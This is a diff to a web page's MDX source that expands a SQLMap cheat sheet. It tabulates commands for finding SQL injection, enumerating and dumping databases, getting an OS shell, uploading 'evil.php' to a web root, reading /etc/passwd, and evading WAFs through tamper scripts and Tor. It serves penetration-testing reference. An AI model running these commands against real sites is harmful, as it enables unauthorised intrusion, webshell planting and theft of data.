@@ -1,14 +1,135 @@
+---
+title: SQLMap
+slug: sqlmap
+description: Automated SQL injection and database takeover tool.
+categories: ["Exploitation", "Web Application Security"]
+bgColor: "bg-indigo-100"
+textColor: "text-indigo-800"
+top: true
+---
+
 export const metadata = {
   title: "SQLMap",
-  category: "Web Application Testing",
+  category: "Exploitation",
   slug: "sqlmap",
 };
 
-# SQLMap Cheatsheet
+## SQLMap Commands Cheat Sheet
 
-SQLMap automates the process of detecting and exploiting SQL injection flaws.
 
-## Useful Commands
+### 🔍 1. Discovery & Detection
+Commands to identify SQL injection vulnerabilities and types.
 
-- `sqlmap -u "http://site.com?id=1" --dbs`
-- `sqlmap -r request.txt --batch`
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL>` | Basic SQL injection test. |
+| `sqlmap -u <target_URL> --technique=BLIND` | Test for blind SQL injection. |
+| `sqlmap -u <target_URL> --technique=TIME` | Specifically test for time-based blind injection. |
+| `sqlmap -u <target_URL> --risk=3 --level=5` | Increase risk and level for more thorough testing. |
+| `sqlmap -u <target_URL> --crawl=3` | Crawl target site to find injectable URLs. |
+| `sqlmap -u <target_URL> --forms` | Test all forms on the page for injection. |
+| `sqlmap -u <target_URL> --batch` | Skip user prompts for automated testing. |
+
+---
+
+### 🏗️ 2. Database Structure Enumeration
+Commands to map out databases, tables, and columns.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> --dbs` | Enumerate all databases. |
+| `sqlmap -u <target_URL> -D <database_name> --tables` | List tables in a database. |
+| `sqlmap -u <target_URL> -D <database_name> -T <table_name> --columns` | List columns in a table. |
+
+---
+
+### 🧾 3. Data Extraction
+Commands to retrieve data from database tables.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump` | Dump data from a specific table. |
+| `sqlmap -u <target_URL> --dump-all` | Dump all data from all databases. |
+| `sqlmap -u <target_URL> --search -C <column_name>` | Search for specific columns across databases. |
+
+---
+
+### 🖥️ 4. Shell Access & File Operations
+Commands for advanced exploitation and server interaction.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> --sql-shell` | Open interactive SQL shell. |
+| `sqlmap -u <target_URL> --os-shell` | Try to get an OS shell on the server. |
+| `sqlmap -u <target_URL> --file-write=evil.php --file-dest=/var/www/html/evil.php` | Upload a file to the target server. |
+| `sqlmap -u <target_URL> --file-read=/etc/passwd` | Read a file from the server. |
+
+---
+
+### 🧰 5. Customization & Headers
+Fine-tune HTTP requests with headers, cookies, and method.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> --cookie="SESSIONID=xyz"` | Include cookies in requests. |
+| `sqlmap -u <target_URL> --header="X-Custom: value"` | Add custom HTTP headers. |
+| `sqlmap -u <target_URL> --user-agent="CustomAgent"` | Set a custom User-Agent header. |
+| `sqlmap -u <target_URL> --referer="https://google.com"` | Set a custom Referer header. |
+| `sqlmap -u <target_URL> --method=POST --data="username=admin&password=pass"` | Use POST method with custom data. |
+
+---
+
+### 🛡️ 6. Evading Detection
+Options to bypass Web Application Firewalls (WAFs) and filtering.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> --tamper=space2comment` | Use tamper script to evade filters. |
+| `sqlmap -u <target_URL> --random-agent` | Use a random User-Agent for requests. |
+| `sqlmap -u <target_URL> --tor --tor-type=SOCKS5 --check-tor` | Route traffic through Tor network for anonymity. |
+| `sqlmap -u <target_URL> --waf` | Detect and attempt to bypass WAF. |
+
+---
+
+### 🧪 7. Output & Logging
+Control output saving and verbosity.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap -u <target_URL> --output-dir=outputs` | Save all output to the specified directory. |
+| `sqlmap -u <target_URL> --verbose=3` | Show detailed verbose output. |
+| `sqlmap -u <target_URL> -v 0` | Suppress most output (quiet mode). |
+
+---
+
+### 📁 8. Configuration & Help
+Helpful commands for configuration and assistance.
+
+| Command | Description |
+|---------|-------------|
+| `sqlmap --help` or `sqlmap -h` | Show help and usage information. |
+| `sqlmap -u <target_URL> --update` | Update SQLMap to the latest version. |
+| `sqlmap -u <target_URL> --conf=config.txt` | Load options from a configuration file. |
+
+---
+
+## Example Usage {.cols-1}
+
+```bash
+# Test a URL for SQL Injection
+sqlmap -u "http://example.com/vuln.php?id=1"
+
+# Enumerate databases
+sqlmap -u "http://example.com/vuln.php?id=1" --dbs
+
+# List tables in 'users' database
+sqlmap -u "http://example.com/vuln.php?id=1" -D users --tables
+
+# Dump data from 'accounts' table in 'users' database
+sqlmap -u "http://example.com/vuln.php?id=1" -D users -T accounts --dump
+
+# Use a proxy for traffic analysis
+sqlmap -u "http://example.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
+
+# Run with custom HTTP header
+sqlmap -u "http://example.com/vuln.php?id=1" --header="Authorization: Bearer token123"
